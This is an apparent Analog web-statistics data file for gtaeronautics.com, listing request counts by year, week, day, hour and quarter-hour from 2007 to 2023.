x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2023	04	02	05	51
x	FR	2007	12	18	17	05
x	LR	2023	03	31	23	21
x	E7	2023	04	02	05	51
x	SR	1120693
x	S7	1678
x	NC	437829
x	C7	0
x	FL	448156
x	F7	542
x	RR	199
x	R7	2
x	NH	98912
x	H7	326
x	BT	54672653602
x	B7	198448159
1	Rr	27695	2.471	2023
1	Rr	82334	7.347	2022
1	Rr	98917	8.826	2021
1	Rr	89380	7.975	2020
1	Rr	80088	7.146	2019
1	Rr	68927	6.150	2018
1	Rr	60168	5.369	2017
1	Rr	73316	6.542	2016
1	Rr	80796	7.209	2015
1	Rr	110773	9.884	2014
1	Rr	65173	5.815	2013
1	Rr	60742	5.420	2012
1	Rr	57015	5.087	2011
1	Rr	22139	1.975	2010
1	Rr	69710	6.220	2009
1	Rr	71820	6.409	2008
1	Rr	1700	0.152	2007
1	*BT	R	110773	2014
W	Rr	1696	0.151	2015	01	11
W	Rr	1707	0.152	2015	01	04
W	Rr	1833	0.164	2014	12	28
W	Rr	1335	0.119	2014	12	21
W	Rr	1644	0.147	2014	12	14
W	Rr	1541	0.138	2014	12	07
W	Rr	1335	0.119	2014	11	30
W	Rr	1262	0.113	2014	11	23
W	Rr	2009	0.179	2014	11	16
W	Rr	1566	0.140	2014	11	09
W	Rr	1814	0.162	2014	11	02
W	Rr	1452	0.130	2014	10	26
W	Rr	1642	0.147	2014	10	19
W	Rr	1795	0.160	2014	10	12
W	Rr	1836	0.164	2014	10	05
W	Rr	1662	0.148	2014	09	28
W	Rr	1843	0.164	2014	09	21
W	Rr	1678	0.150	2014	09	14
W	Rr	1598	0.143	2014	09	07
W	Rr	1418	0.127	2014	08	31
W	Rr	1584	0.141	2014	08	24
W	Rr	1571	0.140	2014	08	17
W	Rr	1727	0.154	2014	08	10
W	Rr	1927	0.172	2014	08	03
W	Rr	1691	0.151	2014	07	27
W	Rr	1702	0.152	2014	07	20
W	Rr	1624	0.145	2014	07	13
W	Rr	1831	0.163	2014	07	06
W	Rr	1867	0.167	2014	06	29
W	Rr	1927	0.172	2014	06	22
W	Rr	2134	0.190	2014	06	15
W	Rr	4851	0.433	2014	06	08
W	Rr	2293	0.205	2014	06	01
W	Rr	3180	0.284	2014	05	25
W	Rr	1468	0.131	2014	05	18
W	Rr	1808	0.161	2014	05	11
W	Rr	1998	0.178	2014	05	04
W	Rr	1876	0.167	2014	04	27
W	Rr	2330	0.208	2014	04	20
W	Rr	2565	0.229	2014	04	13
W	Rr	2652	0.237	2014	04	06
W	Rr	2574	0.230	2014	03	30
W	Rr	1186	0.106	2014	03	23
W	Rr	1305	0.116	2014	03	16
W	Rr	2273	0.203	2014	03	09
W	Rr	2231	0.199	2014	03	02
W	Rr	1925	0.172	2014	02	23
W	Rr	7060	0.630	2014	02	16
W	Rr	2854	0.255	2014	02	09
W	Rr	3190	0.285	2014	02	02
W	Rr	3743	0.334	2014	01	26
W	Rr	3643	0.325	2014	01	19
W	Rr	2961	0.264	2014	01	12
W	Rr	2319	0.207	2014	01	05
W	Rr	981	0.088	2013	12	29
W	Rr	1108	0.099	2013	12	22
W	Rr	1226	0.109	2013	12	15
W	Rr	1285	0.115	2013	12	08
W	Rr	1289	0.115	2013	12	01
W	Rr	1404	0.125	2013	11	24
W	Rr	1142	0.102	2013	11	17
W	Rr	1334	0.119	2013	11	10
W	Rr	1277	0.114	2013	11	03
W	Rr	1035	0.092	2013	10	27
W	Rr	1309	0.117	2013	10	20
W	Rr	1302	0.116	2013	10	13
W	Rr	1432	0.128	2013	10	06
W	Rr	1178	0.105	2013	09	29
W	Rr	947	0.085	2013	09	22
W	Rr	1254	0.112	2013	09	15
W	Rr	1099	0.098	2013	09	08
W	Rr	1053	0.094	2013	09	01
W	Rr	1010	0.090	2013	08	25
W	Rr	1102	0.098	2013	08	18
W	Rr	1063	0.095	2013	08	11
W	Rr	1105	0.099	2013	08	04
W	Rr	1377	0.123	2013	07	28
W	Rr	1498	0.134	2013	07	21
W	Rr	1295	0.116	2013	07	14
W	Rr	1237	0.110	2013	07	07
W	Rr	1003	0.089	2013	06	30
W	Rr	1275	0.114	2013	06	23
W	Rr	1072	0.096	2013	06	16
W	Rr	1249	0.111	2013	06	09
W	Rr	1521	0.136	2013	06	02
W	Rr	1256	0.112	2013	05	26
W	Rr	1091	0.097	2013	05	19
W	Rr	1359	0.121	2013	05	12
W	Rr	1130	0.101	2013	05	05
W	Rr	1215	0.108	2013	04	28
W	Rr	1368	0.122	2013	04	21
W	Rr	1318	0.118	2013	04	14
W	Rr	1408	0.126	2013	04	07
W	Rr	1277	0.114	2013	03	31
W	Rr	1452	0.130	2013	03	24
W	Rr	1418	0.127	2013	03	17
W	Rr	1217	0.109	2013	03	10
W	Rr	1490	0.133	2013	03	03
W	Rr	1353	0.121	2013	02	24
W	Rr	1268	0.113	2013	02	17
W	Rr	1274	0.114	2013	02	10
W	Rr	1153	0.103	2013	02	03
W	Rr	1266	0.113	2013	01	27
W	Rr	1271	0.113	2013	01	20
W	Rr	1449	0.129	2013	01	13
W	Rr	1253	0.112	2013	01	06
W	Rr	1309	0.117	2012	12	30
W	Rr	1156	0.103	2012	12	23
W	Rr	1336	0.119	2012	12	16
W	Rr	1575	0.141	2012	12	09
W	Rr	1087	0.097	2012	12	02
W	Rr	1376	0.123	2012	11	25
W	Rr	1136	0.101	2012	11	18
W	Rr	1341	0.120	2012	11	11
W	Rr	1418	0.127	2012	11	04
W	Rr	1103	0.098	2012	10	28
W	Rr	1200	0.107	2012	10	21
W	Rr	1382	0.123	2012	10	14
W	Rr	1127	0.101	2012	10	07
W	Rr	1187	0.106	2012	09	30
W	Rr	1172	0.105	2012	09	23
W	Rr	1034	0.092	2012	09	16
W	Rr	944	0.084	2012	09	09
W	Rr	958	0.085	2012	09	02
W	Rr	734	0.065	2012	08	26
W	Rr	881	0.079	2012	08	19
W	Rr	874	0.078	2012	08	12
W	Rr	973	0.087	2012	08	05
W	Rr	1010	0.090	2012	07	29
W	Rr	943	0.084	2012	07	22
W	Rr	1089	0.097	2012	07	15
W	Rr	888	0.079	2012	07	08
W	Rr	845	0.075	2012	07	01
W	Rr	1070	0.095	2012	06	24
W	Rr	1050	0.094	2012	06	17
W	Rr	1271	0.113	2012	06	10
W	Rr	957	0.085	2012	06	03
W	Rr	1249	0.111	2012	05	27
W	Rr	1055	0.094	2012	05	20
W	Rr	1392	0.124	2012	05	13
W	Rr	1140	0.102	2012	05	06
W	Rr	1807	0.161	2012	04	29
W	Rr	1225	0.109	2012	04	22
W	Rr	1264	0.113	2012	04	15
W	Rr	1075	0.096	2012	04	08
W	Rr	1261	0.113	2012	04	01
W	Rr	1345	0.120	2012	03	25
W	Rr	1254	0.112	2012	03	18
W	Rr	1478	0.132	2012	03	11
W	Rr	1503	0.134	2012	03	04
W	Rr	1532	0.137	2012	02	26
W	Rr	1464	0.131	2012	02	19
W	Rr	1154	0.103	2012	02	12
W	Rr	1240	0.111	2012	02	05
W	Rr	1088	0.097	2012	01	29
W	Rr	1125	0.100	2012	01	22
W	Rr	60	0.005	2012	01	15
W	Rr	1472	0.131	2012	01	08
W	Rr	1122	0.100	2012	01	01
W	Rr	888	0.079	2011	12	25
W	Rr	1360	0.121	2011	12	18
W	Rr	1486	0.133	2011	12	11
W	Rr	1330	0.119	2011	12	04
W	Rr	1094	0.098	2011	11	27
W	Rr	1062	0.095	2011	11	20
W	Rr	1123	0.100	2011	11	13
W	Rr	975	0.087	2011	11	06
W	Rr	1264	0.113	2011	10	30
W	Rr	1140	0.102	2011	10	23
W	Rr	1211	0.108	2011	10	16
W	Rr	1236	0.110	2011	10	09
W	Rr	1128	0.101	2011	10	02
W	Rr	1083	0.097	2011	09	25
W	Rr	1451	0.129	2011	09	18
W	Rr	1278	0.114	2011	09	11
W	Rr	1219	0.109	2011	09	04
W	Rr	1316	0.117	2011	08	28
W	Rr	1119	0.100	2011	08	21
W	Rr	1484	0.132	2011	08	14
W	Rr	1671	0.149	2011	08	07
W	Rr	1319	0.118	2011	07	31
W	Rr	1197	0.107	2011	07	24
W	Rr	1504	0.134	2011	07	17
W	Rr	1367	0.122	2011	07	10
W	Rr	1205	0.108	2011	07	03
W	Rr	1333	0.119	2011	06	26
W	Rr	1059	0.094	2011	06	19
W	Rr	1353	0.121	2011	06	12
W	Rr	1275	0.114	2011	06	05
W	Rr	983	0.088	2011	05	29
W	Rr	1262	0.113	2011	05	22
W	Rr	1374	0.123	2011	05	15
W	Rr	1076	0.096	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.002	2011	03	20
W	Rr	1317	0.118	2011	03	13
W	Rr	1258	0.112	2011	03	06
W	Rr	1372	0.122	2011	02	27
W	Rr	1226	0.109	2011	02	20
W	Rr	1524	0.136	2011	02	13
W	Rr	1366	0.122	2011	02	06
W	Rr	958	0.085	2011	01	30
W	Rr	1273	0.114	2011	01	23
W	Rr	1560	0.139	2011	01	16
W	Rr	1472	0.131	2011	01	09
W	Rr	1310	0.117	2011	01	02
W	Rr	798	0.071	2010	12	26
W	Rr	935	0.083	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.001	2010	06	27
W	Rr	914	0.082	2010	06	20
W	Rr	1104	0.099	2010	06	13
W	Rr	1096	0.098	2010	06	06
W	Rr	1171	0.104	2010	05	30
W	Rr	1115	0.099	2010	05	23
W	Rr	1170	0.104	2010	05	16
W	Rr	1334	0.119	2010	05	09
W	Rr	1109	0.099	2010	05	02
W	Rr	1067	0.095	2010	04	25
W	Rr	1212	0.108	2010	04	18
W	Rr	1054	0.094	2010	04	11
W	Rr	1325	0.118	2010	04	04
W	Rr	811	0.072	2010	03	28
W	Rr	1195	0.107	2010	03	21
W	Rr	1338	0.119	2010	03	14
W	Rr	1113	0.099	2010	03	07
W	Rr	1103	0.098	2010	02	28
W	Rr	1290	0.115	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.007	2009	12	27
W	Rr	945	0.084	2009	12	20
W	Rr	1140	0.102	2009	12	13
W	Rr	1323	0.118	2009	12	06
W	Rr	1518	0.135	2009	11	29
W	Rr	1352	0.121	2009	11	22
W	Rr	1346	0.120	2009	11	15
W	Rr	1416	0.126	2009	11	08
W	Rr	1734	0.155	2009	11	01
W	Rr	1035	0.092	2009	10	25
W	Rr	1297	0.116	2009	10	18
W	Rr	1267	0.113	2009	10	11
W	Rr	1440	0.128	2009	10	04
W	Rr	1521	0.136	2009	09	27
W	Rr	1121	0.100	2009	09	20
W	Rr	875	0.078	2009	09	13
W	Rr	1032	0.092	2009	09	06
W	Rr	1283	0.114	2009	08	30
W	Rr	1214	0.108	2009	08	23
W	Rr	1402	0.125	2009	08	16
W	Rr	1260	0.112	2009	08	09
W	Rr	1404	0.125	2009	08	02
W	Rr	1380	0.123	2009	07	26
W	Rr	1470	0.131	2009	07	19
W	Rr	1750	0.156	2009	07	12
W	Rr	1847	0.165	2009	07	05
W	Rr	1889	0.169	2009	06	28
W	Rr	1312	0.117	2009	06	21
W	Rr	1093	0.098	2009	06	14
W	Rr	1363	0.122	2009	06	07
W	Rr	1251	0.112	2009	05	31
W	Rr	1352	0.121	2009	05	24
W	Rr	1133	0.101	2009	05	17
W	Rr	1887	0.168	2009	05	10
W	Rr	1369	0.122	2009	05	03
W	Rr	1089	0.097	2009	04	26
W	Rr	1160	0.104	2009	04	19
W	Rr	1189	0.106	2009	04	12
W	Rr	1529	0.136	2009	04	05
W	Rr	1155	0.103	2009	03	29
W	Rr	1230	0.110	2009	03	22
W	Rr	1029	0.092	2009	03	15
W	Rr	1234	0.110	2009	03	08
W	Rr	1486	0.133	2009	03	01
W	Rr	1470	0.131	2009	02	22
W	Rr	1198	0.107	2009	02	15
W	Rr	1802	0.161	2009	02	08
W	Rr	1653	0.147	2009	02	01
W	Rr	1346	0.120	2009	01	25
W	Rr	1431	0.128	2009	01	18
W	Rr	1678	0.150	2009	01	11
W	Rr	1591	0.142	2009	01	04
W	Rr	886	0.079	2008	12	28
W	Rr	1148	0.102	2008	12	21
W	Rr	1428	0.127	2008	12	14
W	Rr	1508	0.135	2008	12	07
W	Rr	1194	0.107	2008	11	30
W	Rr	1070	0.095	2008	11	23
W	Rr	1396	0.125	2008	11	16
W	Rr	1255	0.112	2008	11	09
W	Rr	1314	0.117	2008	11	02
W	Rr	1397	0.125	2008	10	26
W	Rr	1638	0.146	2008	10	19
W	Rr	1298	0.116	2008	10	12
W	Rr	430	0.038	2008	10	05
W	Rr	723	0.065	2008	09	28
W	Rr	1308	0.117	2008	09	21
W	Rr	1242	0.111	2008	09	14
W	Rr	1409	0.126	2008	09	07
W	Rr	1142	0.102	2008	08	31
W	Rr	1022	0.091	2008	08	24
W	Rr	1062	0.095	2008	08	17
W	Rr	1188	0.106	2008	08	10
W	Rr	1232	0.110	2008	08	03
W	Rr	1050	0.094	2008	07	27
W	Rr	1272	0.114	2008	07	20
W	Rr	1305	0.116	2008	07	13
W	Rr	1093	0.098	2008	07	06
W	Rr	1182	0.105	2008	06	29
W	Rr	1937	0.173	2008	06	22
W	Rr	1493	0.133	2008	06	15
W	Rr	1083	0.097	2008	06	08
W	Rr	1283	0.114	2008	06	01
W	Rr	1432	0.128	2008	05	25
W	Rr	1726	0.154	2008	05	18
W	Rr	1580	0.141	2008	05	11
W	Rr	2661	0.237	2008	05	04
W	Rr	3648	0.326	2008	04	27
W	Rr	1400	0.125	2008	04	20
W	Rr	1365	0.122	2008	04	13
W	Rr	1213	0.108	2008	04	06
W	Rr	1670	0.149	2008	03	30
W	Rr	1211	0.108	2008	03	23
W	Rr	1144	0.102	2008	03	16
W	Rr	1301	0.116	2008	03	09
W	Rr	1292	0.115	2008	03	02
W	Rr	1427	0.127	2008	02	24
W	Rr	2207	0.197	2008	02	17
W	Rr	1124	0.100	2008	02	10
W	Rr	1561	0.139	2008	02	03
W	Rr	1533	0.137	2008	01	27
W	Rr	1389	0.124	2008	01	20
W	Rr	1133	0.101	2008	01	13
W	Rr	1404	0.125	2008	01	06
W	Rr	976	0.087	2007	12	30
W	Rr	801	0.071	2007	12	23
W	Rr	675	0.060	2007	12	16
W	*BT	R	7060	2014	02	16
D	Rr	204	0.018	2023	03	31
D	Rr	127	0.011	2023	03	30
D	Rr	329	0.029	2023	03	29
D	Rr	324	0.029	2023	03	28
D	Rr	492	0.044	2023	03	27
D	Rr	225	0.020	2023	03	26
D	Rr	0	0.000	2023	03	25
D	Rr	273	0.024	2023	03	24
D	Rr	334	0.030	2023	03	23
D	Rr	337	0.030	2023	03	22
D	Rr	384	0.034	2023	03	21
D	Rr	312	0.028	2023	03	20
D	Rr	303	0.027	2023	03	19
D	Rr	0	0.000	2023	03	18
D	Rr	484	0.043	2023	03	17
D	Rr	308	0.027	2023	03	16
D	Rr	412	0.037	2023	03	15
D	Rr	407	0.036	2023	03	14
D	Rr	405	0.036	2023	03	13
D	Rr	209	0.019	2023	03	12
D	Rr	0	0.000	2023	03	11
D	Rr	228	0.020	2023	03	10
D	Rr	258	0.023	2023	03	09
D	Rr	531	0.047	2023	03	08
D	Rr	570	0.051	2023	03	07
D	Rr	366	0.033	2023	03	06
D	Rr	239	0.021	2023	03	05
D	Rr	0	0.000	2023	03	04
D	Rr	329	0.029	2023	03	03
D	Rr	933	0.083	2023	03	02
D	Rr	1525	0.136	2023	03	01
D	Rr	538	0.048	2023	02	28
D	Rr	418	0.037	2023	02	27
D	Rr	312	0.028	2023	02	26
D	Rr	0	0.000	2023	02	25
D	Rr	383	0.034	2023	02	24
D	Rr	466	0.042	2023	02	23
D	Rr	343	0.031	2023	02	22
D	Rr	715	0.064	2023	02	21
D	Rr	259	0.023	2023	02	20
D	Rr	240	0.021	2023	02	19
D	Rr	0	0.000	2023	02	18
D	*BT	R	2131	2008	05	03
d	Rr	135119	12.057	Sun
d	Rr	181346	16.182	Mon
d	Rr	185705	16.571	Tue
d	Rr	184674	16.479	Wed
d	Rr	183638	16.386	Thu
d	Rr	173187	15.454	Fri
d	Rr	77024	6.873	Sat
H	Rr	6	0.001	2023	03	31	23
H	Rr	3	0.000	2023	03	31	22
H	Rr	1	0.000	2023	03	31	21
H	Rr	2	0.000	2023	03	31	20
H	Rr	36	0.003	2023	03	31	19
H	Rr	2	0.000	2023	03	31	18
H	Rr	28	0.002	2023	03	31	17
H	Rr	26	0.002	2023	03	31	16
H	Rr	1	0.000	2023	03	31	15
H	Rr	9	0.001	2023	03	31	14
H	Rr	1	0.000	2023	03	31	13
H	Rr	3	0.000	2023	03	31	12
H	Rr	5	0.000	2023	03	31	11
H	Rr	26	0.002	2023	03	31	10
H	Rr	5	0.000	2023	03	31	09
H	Rr	3	0.000	2023	03	31	08
H	Rr	1	0.000	2023	03	31	07
H	Rr	10	0.001	2023	03	31	06
H	Rr	9	0.001	2023	03	31	05
H	Rr	1	0.000	2023	03	31	04
H	Rr	9	0.001	2023	03	31	03
H	Rr	8	0.001	2023	03	31	02
H	Rr	9	0.001	2023	03	31	01
H	Rr	0	0.000	2023	03	31	00
H	Rr	6	0.001	2023	03	30	23
H	Rr	6	0.001	2023	03	30	22
H	Rr	25	0.002	2023	03	30	21
H	Rr	1	0.000	2023	03	30	20
H	Rr	7	0.001	2023	03	30	19
H	Rr	3	0.000	2023	03	30	18
H	Rr	20	0.002	2023	03	30	17
H	Rr	0	0.000	2023	03	30	16
H	Rr	1	0.000	2023	03	30	15
H	Rr	2	0.000	2023	03	30	14
H	Rr	0	0.000	2023	03	30	13
H	Rr	4	0.000	2023	03	30	12
H	Rr	3	0.000	2023	03	30	11
H	Rr	4	0.000	2023	03	30	10
H	Rr	5	0.000	2023	03	30	09
H	Rr	3	0.000	2023	03	30	08
H	Rr	12	0.001	2023	03	30	07
H	Rr	3	0.000	2023	03	30	06
H	Rr	3	0.000	2023	03	30	05
H	Rr	4	0.000	2023	03	30	04
H	Rr	7	0.001	2023	03	30	03
H	Rr	1	0.000	2023	03	30	02
H	Rr	6	0.001	2023	03	30	01
H	Rr	1	0.000	2023	03	30	00
H	Rr	2	0.000	2023	03	29	23
H	Rr	3	0.000	2023	03	29	22
H	Rr	9	0.001	2023	03	29	21
H	Rr	5	0.000	2023	03	29	20
H	Rr	22	0.002	2023	03	29	19
H	Rr	31	0.003	2023	03	29	18
H	Rr	3	0.000	2023	03	29	17
H	Rr	4	0.000	2023	03	29	16
H	Rr	2	0.000	2023	03	29	15
H	Rr	4	0.000	2023	03	29	14
H	Rr	75	0.007	2023	03	29	13
H	Rr	22	0.002	2023	03	29	12
H	Rr	43	0.004	2023	03	29	11
H	Rr	21	0.002	2023	03	29	10
H	Rr	7	0.001	2023	03	29	09
H	Rr	27	0.002	2023	03	29	08
H	Rr	2	0.000	2023	03	29	07
H	Rr	8	0.001	2023	03	29	06
H	Rr	10	0.001	2023	03	29	05
H	Rr	5	0.000	2023	03	29	04
H	Rr	2	0.000	2023	03	29	03
H	Rr	5	0.000	2023	03	29	02
H	Rr	10	0.001	2023	03	29	01
H	Rr	7	0.001	2023	03	29	00
H	*BT	R	750	2020	12	11	23
h	Rr	43584	3.889	00
h	Rr	42944	3.832	01
h	Rr	43678	3.897	02
h	Rr	43763	3.905	03
h	Rr	41758	3.726	04
h	Rr	39767	3.548	05
h	Rr	38915	3.472	06
h	Rr	38302	3.418	07
h	Rr	36938	3.296	08
h	Rr	35363	3.155	09
h	Rr	36338	3.242	10
h	Rr	39787	3.550	11
h	Rr	39418	3.517	12
h	Rr	42024	3.750	13
h	Rr	49467	4.414	14
h	Rr	55234	4.929	15
h	Rr	60009	5.355	16
h	Rr	60506	5.399	17
h	Rr	60728	5.419	18
h	Rr	60068	5.360	19
h	Rr	58571	5.226	20
h	Rr	55196	4.925	21
h	Rr	50484	4.505	22
h	Rr	47851	4.270	23
4	Rr	2	0.000	2023	03	31	23	15
4	Rr	4	0.000	2023	03	31	23	00
4	Rr	1	0.000	2023	03	31	22	45
4	Rr	0	0.000	2023	03	31	22	30
4	Rr	1	0.000	2023	03	31	22	15
4	Rr	1	0.000	2023	03	31	22	00
4	Rr	0	0.000	2023	03	31	21	45
4	Rr	1	0.000	2023	03	31	21	30
4	Rr	0	0.000	2023	03	31	21	15
4	Rr	0	0.000	2023	03	31	21	00
4	Rr	0	0.000	2023	03	31	20	45
4	Rr	1	0.000	2023	03	31	20	30
4	Rr	0	0.000	2023	03	31	20	15
4	Rr	1	0.000	2023	03	31	20	00
4	Rr	0	0.000	2023	03	31	19	45
4	Rr	36	0.003	2023	03	31	19	30
4	Rr	0	0.000	2023	03	31	19	15
4	Rr	0	0.000	2023	03	31	19	00
4	Rr	1	0.000	2023	03	31	18	45
4	Rr	0	0.000	2023	03	31	18	30
4	Rr	0	0.000	2023	03	31	18	15
4	Rr	1	0.000	2023	03	31	18	00
4	Rr	0	0.000	2023	03	31	17	45
4	Rr	1	0.000	2023	03	31	17	30
4	Rr	27	0.002	2023	03	31	17	15
4	Rr	0	0.000	2023	03	31	17	00
4	Rr	26	0.002	2023	03	31	16	45
4	Rr	0	0.000	2023	03	31	16	30
4	Rr	0	0.000	2023	03	31	16	15
4	Rr	0	0.000	2023	03	31	16	00
4	Rr	1	0.000	2023	03	31	15	45
4	Rr	0	0.000	2023	03	31	15	30
4	Rr	0	0.000	2023	03	31	15	15
4	Rr	0	0.000	2023	03	31	15	00
4	Rr	2	0.000	2023	03	31	14	45
4	Rr	1	0.000	2023	03	31	14	30
4	Rr	6	0.001	2023	03	31	14	15
4	Rr	0	0.000	2023	03	31	14	00
4	Rr	0	0.000	2023	03	31	13	45
4	Rr	1	0.000	2023	03	31	13	30
4	Rr	0	0.000	2023	03	31	13	15
4	Rr	0	0.000	2023	03	31	13	00
4	Rr	0	0.000	2023	03	31	12	45
4	Rr	2	0.000	2023	03	31	12	30
4	Rr	0	0.000	2023	03	31	12	15
4	Rr	1	0.000	2023	03	31	12	00
4	Rr	1	0.000	2023	03	31	11	45
4	Rr	2	0.000	2023	03	31	11	30
4	Rr	1	0.000	2023	03	31	11	15
4	Rr	1	0.000	2023	03	31	11	00
4	Rr	26	0.002	2023	03	31	10	45
4	Rr	0	0.000	2023	03	31	10	30
4	Rr	0	0.000	2023	03	31	10	15
4	Rr	0	0.000	2023	03	31	10	00
4	Rr	2	0.000	2023	03	31	09	45
4	Rr	1	0.000	2023	03	31	09	30
4	Rr	1	0.000	2023	03	31	09	15
4	Rr	1	0.000	2023	03	31	09	00
4	Rr	0	0.000	2023	03	31	08	45
4	Rr	1	0.000	2023	03	31	08	30
4	Rr	1	0.000	2023	03	31	08	15
4	Rr	1	0.000	2023	03	31	08	00
4	Rr	0	0.000	2023	03	31	07	45
4	Rr	0	0.000	2023	03	31	07	30
4	Rr	1	0.000	2023	03	31	07	15
4	Rr	0	0.000	2023	03	31	07	00
4	Rr	2	0.000	2023	03	31	06	45
4	Rr	5	0.000	2023	03	31	06	30
4	Rr	3	0.000	2023	03	31	06	15
4	Rr	0	0.000	2023	03	31	06	00
4	Rr	4	0.000	2023	03	31	05	45
4	Rr	0	0.000	2023	03	31	05	30
4	Rr	4	0.000	2023	03	31	05	15
4	Rr	1	0.000	2023	03	31	05	00
4	Rr	0	0.000	2023	03	31	04	45
4	Rr	0	0.000	2023	03	31	04	30
4	Rr	0	0.000	2023	03	31	04	15
4	Rr	1	0.000	2023	03	31	04	00
4	Rr	8	0.001	2023	03	31	03	45
4	Rr	0	0.000	2023	03	31	03	30
4	Rr	0	0.000	2023	03	31	03	15
4	Rr	1	0.000	2023	03	31	03	00
4	Rr	2	0.000	2023	03	31	02	45
4	Rr	1	0.000	2023	03	31	02	30
4	Rr	3	0.000	2023	03	31	02	15
4	Rr	2	0.000	2023	03	31	02	00
4	Rr	0	0.000	2023	03	31	01	45
4	Rr	5	0.000	2023	03	31	01	30
4	Rr	2	0.000	2023	03	31	01	15
4	Rr	2	0.000	2023	03	31	01	00
4	Rr	0	0.000	2023	03	31	00	45
4	Rr	0	0.000	2023	03	31	00	30
4	Rr	0	0.000	2023	03	31	00	15
4	Rr	0	0.000	2023	03	31	00	00
4	Rr	0	0.000	2023	03	30	23	45
4	Rr	6	0.001	2023	03	30	23	30
4	*BT	R	744	2021	04	12	15	00
6	Rr	10826	0.966	00	00
6	Rr	10877	0.971	00	15
6	Rr	10893	0.972	00	30
6	Rr	10988	0.980	00	45
6	Rr	10695	0.954	01	00
6	Rr	10781	0.962	01	15
6	Rr	10873	0.970	01	30
6	Rr	10595	0.945	01	45
6	Rr	10326	0.921	02	00
6	Rr	11286	1.007	02	15
6	Rr	11181	0.998	02	30
6	Rr	10885	0.971	02	45
6	Rr	10628	0.948	03	00
6	Rr	10032	0.895	03	15
6	Rr	10480	0.935	03	30
6	Rr	12623	1.126	03	45
6	Rr	10503	0.937	04	00
6	Rr	11106	0.991	04	15
6	Rr	9852	0.879	04	30
6	Rr	10297	0.919	04	45
6	Rr	9574	0.854	05	00
6	Rr	10417	0.930	05	15
6	Rr	10118	0.903	05	30
6	Rr	9658	0.862	05	45
6	Rr	10517	0.938	06	00
6	Rr	9769	0.872	06	15
6	Rr	9704	0.866	06	30
6	Rr	8925	0.796	06	45
6	Rr	9444	0.843	07	00
6	Rr	9971	0.890	07	15
6	Rr	9989	0.891	07	30
6	Rr	8898	0.794	07	45
6	Rr	9452	0.843	08	00
6	Rr	9167	0.818	08	15
6	Rr	9704	0.866	08	30
6	Rr	8615	0.769	08	45
6	Rr	8887	0.793	09	00
6	Rr	8887	0.793	09	15
6	Rr	8938	0.798	09	30
6	Rr	8651	0.772	09	45
6	Rr	8685	0.775	10	00
6	Rr	8694	0.776	10	15
6	Rr	8770	0.783	10	30
6	Rr	10189	0.909	10	45
6	Rr	10927	0.975	11	00
6	Rr	9513	0.849	11	15
6	Rr	9660	0.862	11	30
6	Rr	9687	0.864	11	45
6	Rr	10786	0.962	12	00
6	Rr	9355	0.835	12	15
6	Rr	9455	0.844	12	30
6	Rr	9822	0.876	12	45
6	Rr	10284	0.918	13	00
6	Rr	10281	0.917	13	15
6	Rr	10982	0.980	13	30
6	Rr	10477	0.935	13	45
6	Rr	11726	1.046	14	00
6	Rr	12555	1.120	14	15
6	Rr	12610	1.125	14	30
6	Rr	12576	1.122	14	45
6	Rr	13459	1.201	15	00
6	Rr	13165	1.175	15	15
6	Rr	14266	1.273	15	30
6	Rr	14344	1.280	15	45
6	Rr	15074	1.345	16	00
6	Rr	14674	1.309	16	15
